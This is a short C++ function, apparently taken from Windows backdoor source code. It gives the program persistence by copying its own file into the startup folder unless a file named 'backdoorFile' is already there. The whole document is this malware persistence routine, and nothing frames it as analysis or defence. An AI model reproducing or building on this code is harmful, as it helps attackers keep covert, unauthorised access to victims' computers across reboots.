void RegisterStartup(std::string fileName)
{
    startupPath += fileName;
    std::ifstream backdoorFile(startupPath);
    
    if (!backdoorFile.is_open()) {
        CopyFileA(fileName.data(), startupPath.data(), 0);
    }
}